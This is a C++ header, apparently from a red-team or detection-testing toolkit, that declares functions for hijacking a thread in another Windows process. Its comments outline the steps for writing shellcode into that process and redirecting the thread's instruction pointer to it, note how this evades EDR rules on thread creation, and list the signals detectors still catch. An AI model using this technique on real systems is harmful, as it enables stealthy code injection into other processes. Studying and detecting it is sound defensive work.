#pragma once
#ifndef THREADHIJACK_H
#define THREADHIJACK_H
#include "common.h"

// ThreadHijack — thread execution hijacking via GetThreadContext/SetThreadContext.
// MITRE T1055.003 — Thread Execution Hijacking.
//
// Technique:
//   1. OpenThread on a thread in the target process
//   2. SuspendThread
//   3. GetThreadContext — save original RIP
//   4. VirtualAllocEx + WriteProcessMemory — write shellcode to remote process
//   5. SetThreadContext — overwrite RIP with shellcode address
//   6. ResumeThread — thread executes shellcode instead of its original code
//
// WHY this differs from CreateRemoteThread:
//   - No new thread is created (evades "unexpected thread creation" EDR rules)
//   - The executing thread is an EXISTING, legitimate thread
//   - The hijacked thread's original RIP is saved and restored after shellcode runs
//     (if shellcode calls original_rip at the end — self-restoring hijack)
//
// What a strong detector still catches:
//   - SuspendThread + SetThreadContext on a remote thread = Sysmon EID 10
//   - The thread's RIP points into an RWX allocation for the duration
//   - GetThreadContext API call is ETW-visible
//   - Stack walk at resume time shows shellcode address as RIP
//
// MITRE T1055.003

namespace ThreadHijack {
    // Hijack a thread in `pid`: suspend, write shellcode, point RIP at it, resume.
    // targetTid: 0 = pick the first non-GUI thread automatically.
    // Returns TID of hijacked thread, or 0 on failure.
    DWORD Hijack(DWORD pid, DWORD targetTid,
                 const BYTE* shellcode, SIZE_T scSize);

    // Self-restoring hijack: shellcode must end with a JMP to the original RIP.
    // This variant appends a tail to the shellcode that jumps back to saved RIP.
    DWORD HijackRestoring(DWORD pid, DWORD targetTid,
                          const BYTE* shellcode, SIZE_T scSize);

    // Find a suitable hijackable thread in process `pid`.
    DWORD FindThread(DWORD pid);

    // Report: list all threads in a process with their state.
    std::string ListThreads(DWORD pid);
}

#endif
